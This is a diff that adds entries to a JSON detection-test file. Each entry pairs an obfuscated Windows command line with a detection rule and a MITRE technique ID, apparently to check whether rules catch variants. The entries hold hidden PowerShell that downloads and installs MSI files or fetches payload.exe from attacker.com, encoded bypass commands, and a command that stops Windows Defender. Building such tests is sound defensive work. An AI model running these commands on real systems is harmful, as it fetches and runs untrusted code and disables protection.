+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.007_009",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.007_010",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.007_011",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.007_012",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.007_013",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.007",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1218.007_014",
     "target_commandline": "powershell.exe /\"w\" hidden -c \"$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
@@ -12136,6 +13200,38 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1036.005_002",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -\"WindowStyle\" Hidden -Ep Bypass -\"noni\" /\"Command\" \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1036.005_003",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WiNdoWstYle Hidden -EP Bypass -\"noni\" -COmmand \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1036.005_004",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -winDOWstYlE Hidden -ExecutionPolicy Bypass /\"noni\" -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1036.005_005",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WinDOwStYLe Hidden -\"ep\" Bypass -noni -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1036.005_006",
     "target_commandline": "powershell.exe -\"w\" hidden -nop",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
@@ -12146,6 +13242,22 @@
   {
     "test_id": "t1036.005_007",
     "target_commandline": "powershell.exe /\"w\" hidden -nop",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1036.005_008",
+    "target_commandline": "powershell.exe /\"windowstyle\" hidden",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1036.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1036.005_009",
+    "target_commandline": "powershell.exe -\"windowstyle\" hidden",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
     "technique_id": "t1036.005",
     "shell": "cmd.exe",
@@ -12168,6 +13280,38 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_477",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -\"WindowStyle\" Hidden -Ep Bypass -\"noni\" /\"Command\" \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_478",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WiNdoWstYle Hidden -EP Bypass -\"noni\" -COmmand \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_479",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -winDOWstYlE Hidden -ExecutionPolicy Bypass /\"noni\" -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_480",
+    "target_commandline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WinDOwStYLe Hidden -\"ep\" Bypass -noni -c \"Get-Variable -Name PSVersionTable\"",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1059.001_481",
     "target_commandline": "powershell.exe -\"w\" hidden -nop",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
@@ -12180,6 +13324,22 @@
     "target_commandline": "powershell.exe /\"w\" hidden -nop",
     "target_rule": "proc_creation_win_schtasks_powershell_persistence",
     "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059_034",
+    "target_commandline": "powershell.exe /\"windowstyle\" hidden",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059_035",
+    "target_commandline": "powershell.exe -\"windowstyle\" hidden",
+    "target_rule": "proc_creation_win_schtasks_powershell_persistence",
+    "technique_id": "t1059",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
   },
@@ -12752,6 +13912,54 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1003_001",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1003_002",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1003_003",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027_119",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027_120",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027_121",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1027_122",
     "target_commandline": "cmd.exe /c \"W^in^P^wn.exe\"",
     "target_rule": "proc_creation_win_hktl_winpwn",
@@ -12872,6 +14080,46 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1068_001",
+    "target_commandline": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "target_rule": "proc_creation_win_hktl_sharpsuccessor_execution",
+    "technique_id": "t1068",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1068_002",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -encoDeDCoMMAnD VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "target_rule": "proc_creation_win_hktl_sharpsuccessor_execution",
+    "technique_id": "t1068",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1068_003",
+    "target_commandline": "powershell.exe -nop -windoWStylE Hidden -exEcutIoNpOLIcy Bypass -\"EncodedCommand\" VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "target_rule": "proc_creation_win_hktl_sharpsuccessor_execution",
+    "technique_id": "t1068",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1068_004",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden /\"ExecutionPolicy\" Bypass -enc VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "target_rule": "proc_creation_win_hktl_sharpsuccessor_execution",
+    "technique_id": "t1068",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1068_005",
+    "target_commandline": "powershell.exe -nOPRoFiLE -\"WindowStyle\" Hidden -\"ExecutionPolicy\" Bypass -eNcoDEDCOmmaNd VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "target_rule": "proc_creation_win_hktl_sharpsuccessor_execution",
+    "technique_id": "t1068",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1068_006",
     "target_commandline": "cmd.exe /c \"W^in^P^wn.exe\"",
     "target_rule": "proc_creation_win_hktl_winpwn",
@@ -12916,6 +14164,30 @@
     "target_commandline": "powershell.exe -\"ep\" bypass -FILE C:\\temp\\audit.ps1",
     "target_rule": "proc_creation_win_hktl_winpwn",
     "technique_id": "t1106",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_001",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_002",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_003",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
   },
@@ -14272,6 +15544,30 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1059.001_488",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_489",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1059.001_490",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1059.001",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1027.005_012",
     "target_commandline": "powershell.exe /\"Command\" \"$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)\"",
     "target_rule": "proc_creation_win_hktl_crackmapexec_powershell_obfuscation",
@@ -14434,6 +15730,54 @@
   {
     "test_id": "t1027.010_025",
     "target_commandline": "powershell.exe -\"EncodedCommand\" JAB1AD0AJwBoAHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvACcAOwAkAGkAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAoACcAaQBuAGQAbwB3AHMASQBuAHMAdABhAGwAbABlAHIALgBJAG4AcwB0AGEAbABsAGUAcgAnAC4ASQBuAHMAZQByAHQAKAAwACwAJwBXACcAKQApADsAJABpAC4AVQBJAEwAZQB2AGUAbAA9ADIAOwAkAGkALgBJAG4AcwB0AGEAbABsAFAAcgBvAGQAdQBjAHQAKAAkACgAaQBmACgAJAB1AC4AUwB0AGEAcgB0AHMAVwBpAHQAaAAoACcAaAB0AHAAcwA6AC8ALwAnACkAKQB7ACQAdQAuAEkAbgBzAGUAcgB0ACgAMgAsACcAdAAnACkAfQBlAGwAcwBlAHsAJAB1AH0AKQAsACcAJwApADsA",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_026",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_027",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_028",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_029",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_030",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1027.010",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027.010_031",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
     "technique_id": "t1027.010",
     "shell": "cmd.exe",
@@ -16256,6 +17600,54 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1047_259",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_260",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_261",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_262",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_263",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_264",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1047_265",
     "target_commandline": "powershell.exe /\"w\" hidden -c \"$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
@@ -17208,6 +18600,30 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1134_004",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_005",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_006",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1134.002_004",
     "target_commandline": "AdvancedRun.exe  /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs  8 /Run",
     "target_rule": "proc_creation_win_pua_advancedrun_priv_user",
@@ -18026,6 +19442,54 @@
   {
     "test_id": "t1218.005_011",
     "target_commandline": "powershell.exe -\"EncodedCommand\" JAB1AD0AJwBoAHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvACcAOwAkAGkAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAoACcAaQBuAGQAbwB3AHMASQBuAHMAdABhAGwAbABlAHIALgBJAG4AcwB0AGEAbABsAGUAcgAnAC4ASQBuAHMAZQByAHQAKAAwACwAJwBXACcAKQApADsAJABpAC4AVQBJAEwAZQB2AGUAbAA9ADIAOwAkAGkALgBJAG4AcwB0AGEAbABsAFAAcgBvAGQAdQBjAHQAKAAkACgAaQBmACgAJAB1AC4AUwB0AGEAcgB0AHMAVwBpAHQAaAAoACcAaAB0AHAAcwA6AC8ALwAnACkAKQB7ACQAdQAuAEkAbgBzAGUAcgB0ACgAMgAsACcAdAAnACkAfQBlAGwAcwBlAHsAJAB1AH0AKQAsACcAJwApADsA",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_012",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -COMmanD \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_013",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -c \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_014",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_015",
+    "target_commandline": "powershell.exe -wiNDowStyLe Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_016",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
+    "target_rule": "proc_creation_win_powershell_comobject_msi",
+    "technique_id": "t1218.005",
+    "shell": "cmd.exe",
